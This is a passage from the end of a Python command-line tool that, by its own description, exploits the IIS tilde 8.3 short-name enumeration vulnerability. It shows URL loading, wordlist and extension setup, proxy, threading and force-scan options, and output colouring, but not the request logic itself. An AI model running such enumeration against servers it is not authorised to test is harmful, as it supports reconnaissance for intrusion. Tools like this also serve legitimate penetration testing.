        sys.stdout.write(' (interrupted!) ...\n')
        printFindings()
        return

    # Generate dictionary if in dict-only mode
    if args.dict_only:
        generateDictionaryFromFindings(args.dict_output)
    else:
        printFindings()

def main():
    try:
        # Handle URL input - either single URL or file with multiple URLs
        urls_to_scan = []
        
        if args.url_file:
            # Read URLs from file
            try:
                with open(args.url_file, 'r') as f:
                    urls_to_scan = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
                printResult('[+]  Loaded %d URLs from file: %s' % (len(urls_to_scan), args.url_file), bcolors.GREEN)
            except IOError as e:
                printResult('[!]  Error reading URL file: %s' % str(e), bcolors.RED)
                sys.exit()
        elif args.url:
            urls_to_scan = [args.url]
        else:
            printResult('[!]  You need to enter a valid URL (-u) or URL file (-U) for us to test.', bcolors.RED)
            sys.exit()
            
        if not urls_to_scan:
            printResult('[!]  No valid URLs found to scan.', bcolors.RED)
            sys.exit()
            
        if args.limit_extension is not None:
            if args.limit_extension:
                args.limit_extension = args.limit_extension[:3]
                printResult('[-]  --limit-ext is set. Find names end with given extension only: %s'% (args.limit_extension), bcolors.GREEN)
                args.limit_extension = '*' + args.limit_extension
            else:
                printResult('[-]  --limit-ext is set. Find directories only.', bcolors.GREEN)
            
        if args.resume_string:
            printResult('[-]  Resume from "%s"... characters before this will be ignored.' % args.resume_string, bcolors.GREEN)

        if args.wait != 0 :
            printResult('[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.wait)

        if args.path_wordlists:
            printResult('[-]  Asigned wordlists file: %s' % args.path_wordlists)
        else:
            args.path_wordlists = path_wordlists
            printResult('[-]  Wordlists file was not asigned, using: %s' % args.path_wordlists)
            
        if args.path_exts:
            printResult('[-]  Asigned extensions file: %s' % args.path_exts)
        else:
            args.path_exts = path_exts
            printResult('[-]  Extensions file was not asigned, using: %s' % args.path_exts)
        
        if args.path_exts_ignore:
            printResult('[-]  Asigned ignorable extensions file: %s' % args.path_exts_ignore)
        else:
            args.path_exts_ignore = path_exts_ignore
            printResult('[-]  Ignorable file was not asigned, using: %s' % args.path_exts_ignore)
            
        # Handle dictionaries (load once for all URLs)
        wordlists.extend(file2List(args.path_wordlists))
        exts.extend(file2List(args.path_exts))
        exts_ignore.extend(file2List(args.path_exts_ignore))
        
        # Process each URL
        for i, target_url in enumerate(urls_to_scan, 1):
            if len(urls_to_scan) > 1:
                printResult('\\n[*]  Processing URL %d/%d: %s' % (i, len(urls_to_scan), target_url), bcolors.CYAN)
            processURL(target_url)
        
    except KeyboardInterrupt:
        sys.exit()


#=================================================
# START
#=================================================

# Command Line Arguments
parser = argparse.ArgumentParser(description='Advanced IIS Tilde 8.3 Enumeration Tool v3.0 by Husky - Exploits IIS tilde enumeration vulnerability with dictionary generation and multi-threading support')
parser.add_argument('-c', dest='cookie', help='Cookie Header value')
parser.add_argument('-d', dest='path_wordlists', help='Path of wordlists file')
parser.add_argument('-e', dest='path_exts', help='Path of extensions file')
parser.add_argument('-f', action='store_true', default=False, help='Force testing even if the server seems not vulnerable')
parser.add_argument('-g', action='store_true', default=False, dest='enable_google', help='Enable Google keyword suggestion to enhance wordlists')
parser.add_argument('--tilde-guess', action='store_true', default=False, dest='enable_tilde_guess', help='Enable tildeGuess algorithm for enhanced filename matching (default: False)')
parser.add_argument('--dict-only', action='store_true', default=False, dest='dict_only', help='Generate dictionary only, skip URL testing')
parser.add_argument('--dict-output', dest='dict_output', default='generated_wordlist.txt', help='Output dictionary to file (default: generated_wordlist.txt, use "-" for stdout)')
parser.add_argument('-o', dest='out_file',default='', help='Filename to store output')
parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
parser.add_argument('-u', dest='url', help='URL to scan')
parser.add_argument('-U', dest='url_file', help='File containing multiple URLs to scan (one per line)')
parser.add_argument('-v', dest='verbose_level', type=int, default=1, help='verbose level of output (0~2)')
parser.add_argument('-w', dest='wait', default=0, type=float, help='time in seconds to wait between requests')
parser.add_argument('-t', dest='threads', type=int, default=10, help='Number of threads for enumeration (default: 10)')
parser.add_argument('--timeout', dest='timeout', type=int, default=10, help='HTTP request timeout in seconds (default: 10)')
parser.add_argument('--ignore-ext', dest='path_exts_ignore', help='Path of ignorable extensions file')
parser.add_argument('--limit-ext', dest='limit_extension', help='Enumerate for given extension only') # empty string for directory
parser.add_argument('--resume', dest='resume_string', help='Resume from a given name (length lt 6)')
args = parser.parse_args()

# COLORIZATION OF OUTPUT
# The entire bcolors class was taken verbatim from the Social Engineer's Toolkit (ty @SET)
if not os.name == "nt":
    class bcolors:
        PURPLE = '\033[95m'        # Verbose
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'        # Normal
        YELLOW = '\033[93m'        # Findings
        RED = '\033[91m'        # Errors
        ENDC = '\033[0m'        # End colorization

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

# If we are running on Windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = 0x05
        CYAN = 0x0B
        DARKCYAN = 0x03
        BLUE = 0x09
        GREEN = 0x0A
        YELLOW = 0x0E
        RED = 0x0C
        ENDC = 0x07

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

if args.proxy:
    printResult('[-]  Using proxy for requests: ' + args.proxy, bcolors.PURPLE)
    proxy = urllib.request.ProxyHandler({'http': args.proxy, 'https': args.proxy})
    opener = urllib.request.build_opener(proxy)
    urllib.request.install_opener(opener)

if args.verbose_level > 1:
    printResult('[-]  Verbose Level=%d ....brace yourself for additional information.'%args.verbose_level, bcolors.PURPLE, 2)

if __name__ == "__main__": main()
